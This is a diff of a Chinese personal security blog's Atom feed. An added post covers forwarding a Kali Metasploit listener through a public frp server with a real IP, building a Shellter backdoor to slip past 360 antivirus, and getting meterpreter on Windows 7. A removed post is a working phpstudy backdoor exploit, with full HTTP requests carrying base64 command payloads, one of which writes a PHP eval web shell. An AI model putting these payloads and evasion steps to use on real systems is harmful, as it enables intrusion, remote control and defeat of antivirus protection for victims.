@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com/</id>
     <title>斯文beast</title>
-    <updated>2019-12-27T02:04:59.782Z</updated>
+    <updated>2019-12-27T08:34:06.911Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com/"/>
     <link rel="self" href="http://www.svenbeast.com//atom.xml"/>
@@ -10,6 +10,67 @@
     <logo>http://www.svenbeast.com//images/avatar.png</logo>
     <icon>http://www.svenbeast.com//favicon.ico</icon>
     <rights>All rights reserved 2019, 斯文beast</rights>
+    <entry>
+        <title type="html"><![CDATA[kali转发公网+过360+入侵windows7]]></title>
+        <id>http://www.svenbeast.com//post/RD6ZQ1MX_</id>
+        <link href="http://www.svenbeast.com//post/RD6ZQ1MX_">
+        </link>
+        <updated>2019-12-27T06:57:17.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="0x01-此篇为个人记录">0x01 此篇为个人记录</h3>
+<ul>
+<li>
+<pre><code>  工具人一枚，
+</code></pre>
+</li>
+<li>
+<pre><code>             就会组合操作，
+</code></pre>
+</li>
+<li>
+<pre><code>                           菜是原罪。
+</code></pre>
+</li>
+</ul>
+<h3 id="0x02-配置frp使kali接受公网shell">0x02 配置frp，使kali接受公网shell</h3>
+<p>配置内容：</p>
+<pre><code>公网windows的frps.ini配置内容
+[common]
+bind_port = 7000
+dashboard_port = 7500
+dashboard_user = admin
+dashboard_pwd = admin
+
+虚拟机kali机的frpc.ini配置内容
+[common]
+server_addr = 129.28.191.182   //鄙人的公网ip
+server_port = 7000
+
+[msf]
+type = tcp
+local_ip = 127.0.0.1
+local_port = 6666
+remote_port = 4446
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1577431332788.png" alt=""></figure>
+<pre><code>* 命令按顺序排序：
+
+./frps -c frps.ini &gt; log.txt &amp;                  //公网windows开启frp
+./frpc -c frpc.ini &gt; log.txt &amp;                     //虚拟机kali开启frp
+后门设置：lhsot：129.28.191.182   lport:4446
+
+</code></pre>
+<h3 id="0x03-shellter生成后门">0x03 shellter生成后门</h3>
+<ul>
+<li>尝试过多种方法，最后发现真的还是这个香<br>
+<img src="http://www.svenbeast.com//post-images/1577434809015.gif" alt=""></li>
+</ul>
+<h3 id="0x04-在win7的360套餐获得meterpreter">0x04 在Win7的360套餐获得meterpreter</h3>
+<ul>
+<li>下次联动cs，作为web狗得慢慢来 -.-!<br>
+<img src="http://www.svenbeast.com//post-images/1577435547116.gif" alt=""></li>
+</ul>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[java RMI反序列化无含量记录]]></title>
         <id>http://www.svenbeast.com//post/TWAepnjZi</id>
@@ -649,72 +710,6 @@ if __name__ == '__main__':
 
 
 </code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[phpstudy后门利用方法及getshell]]></title>
-        <id>http://www.svenbeast.com//post/2OBQlt_Ta</id>
-        <link href="http://www.svenbeast.com//post/2OBQlt_Ta">
-        </link>
-        <updated>2019-09-24T08:36:03.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="0x01-phpstudy利用方法">0x01 phpstudy利用方法</h3>
-<ul>
-<li>请求任意后缀为php的文件</li>
-<li>目标环境为php5.2,5.4,且不能为nts</li>
-<li>存在Accept-Encoding: gzip,deflate</li>
-<li>此处填写base64加密后的payload：accept-charset: c3lzdGVtKCdjYWxjLmV4ZScpOw</li>
-</ul>
-<pre><code>GET /phpinfo.php HTTP/1.1
-Host: 192.168.1.1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
-Sec-Fetch-Site: none,
-accept-charset: c3lzdGVtKCdjYWxjLmV4ZScpOw
-Accept-Encoding: gzip,deflate
-Accept-Language: zh-CN,zh;q=0.9
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1569315041105.png" alt=""></figure>
-<h3 id="0x02-getshell-远程连接">0x02 getshell 远程连接</h3>
-<p>system('echo ^&lt;?php @eval($_POST[&quot;shell&quot;])?^&gt;&gt;PHPTutorial\WWW\shell.php');<br>
-↓<br>
-c3lzdGVtKCdlY2hvIF48P3BocCBAZXZhbCgkX1BPU1RbInNoZWxsIl0pP14+PlBIUFR1dG9yaWFsXFdXV1xzaGVsbC5waHAnKTs=</p>
-<pre><code>GET /phpinfo.php HTTP/1.1
-Host: 192.168.1.1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
-Sec-Fetch-Site: none,
-accept-charset: c3lzdGVtKCdlY2hvIF48P3BocCBAZXZhbCgkX1BPU1RbInNoZWxsIl0pP14+PlBIUFR1dG9yaWFsXFdXV1xzaGVsbC5waHAnKTs=
-Accept-Encoding: gzip,deflate
-Accept-Language: zh-CN,zh;q=0.9
-</code></pre>
-<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1569316391812.png" alt=""></figure>
-<h3 id="0x03-无文件落地getshell">0x03 无文件落地getshell</h3>
-<ul>
-<li>利用phpstudy的后门实现无文件落地蚁剑getshell，但有时会不成功，设置完毕后连接即可<br>
-<img src="http://www.svenbeast.com//post-images/1570670091804.png" alt=""><br>
-<img src="http://www.svenbeast.com//post-images/1570670330433.png" alt=""><br>
-<img src="http://www.svenbeast.com//post-images/1570670362485.png" alt=""></li>
-</ul>
-<h3 id="0x04-可能会遇到的问题">0x04 可能会遇到的问题</h3>
-<ul>
-<li>若无法成功连接，可能生成目录不对，执行命令tree /f查看文件树，找到可访问路径生成shell</li>
-</ul>
-<pre><code>GET /phpinfo.php HTTP/1.1
-Host: 192.168.1.1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
-Sec-Fetch-Site: none,
-accept-charset: c3lzdGVtKCd0cmVlIC9mJyk7
-Accept-Encoding: gzip,deflate
-Accept-Language: zh-CN,zh;q=0.9
-</code></pre>
-<figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1569316868542.png" alt=""></figure>
 ]]></content>
     </entry>
 </feed>
